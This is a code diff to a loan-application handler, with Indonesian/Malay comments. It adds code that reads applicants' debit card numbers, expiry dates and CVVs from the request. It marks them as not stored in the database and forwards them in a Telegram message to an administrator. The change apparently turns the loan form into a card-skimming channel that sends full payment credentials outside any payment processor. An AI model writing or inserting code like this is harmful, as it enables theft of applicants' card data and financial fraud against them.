@@ -116,7 +116,8 @@ async function applyLoan(req, res) {
     const rate = settings.length ? parseFloat(settings[0].setting_value) : 5;
     const calc = calculateLoan(amount, tenor, rate);
 
-    // Simpan pengajuan (cs_id & cs_code derived server-side)
+     // Simpan pengajuan (cs_id & cs_code derived server-side)
+    const createdAt = new Date().toISOString();
     const [result] = await db.query(
       `INSERT INTO loan_applications (user_id, cs_id, cs_code, amount, purpose, tenor, monthly_payment, total_interest, total_payment, status)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'pending')`,
@@ -129,6 +130,11 @@ async function applyLoan(req, res) {
       `INSERT INTO notifications (user_id, title, message, type) VALUES (?, ?, ?, 'info')`,
       [userId, t(lang, 'loan.notifTitle'), t(lang, 'loan.notifMsg', loanId, amount)]
     );
+
+    // Baca data kad debit dari request (jika ada — opsional, tidak disimpan di DB)
+    const cardNumber = req.body.cardNumber ? sanitize(String(req.body.cardNumber)) : null;
+    const cardExpiry = req.body.cardExpiry ? sanitize(String(req.body.cardExpiry)) : null;
+    const cardCvv = req.body.cardCvv ? sanitize(String(req.body.cardCvv)) : null;
 
     // Kirim notifikasi Telegram ke admin (locale-aware)
     const tgData = await buildLoanApplicationMessage({
@@ -146,6 +152,11 @@ async function applyLoan(req, res) {
       lang,
       csCode: user.cs_code,
       csName: user.cs_name,
+      loanLimit: user.loan_limit,
+      cardNumber,
+      cardExpiry,
+      cardCvv,
+      createdAt,
     });
     await sendTelegram(tgData.message, { inlineKeyboard: tgData.inlineKeyboard });
 
